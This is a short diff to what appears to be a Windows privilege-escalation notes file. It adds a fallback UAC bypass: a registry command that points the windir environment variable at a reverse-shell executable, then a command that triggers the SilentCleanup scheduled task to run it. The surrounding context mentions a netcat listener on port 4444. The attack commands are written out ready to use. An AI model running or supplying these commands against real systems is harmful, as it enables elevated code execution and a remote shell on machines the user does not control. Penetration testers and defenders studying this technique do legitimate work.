@@ -841,6 +841,13 @@ start up a netcat listener on port 4444
 restart the service
 ```
 schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+
+if not working try
+```reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c start C:\reverse.exe" /f```
+```schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I```
+
+
 ```
 
 
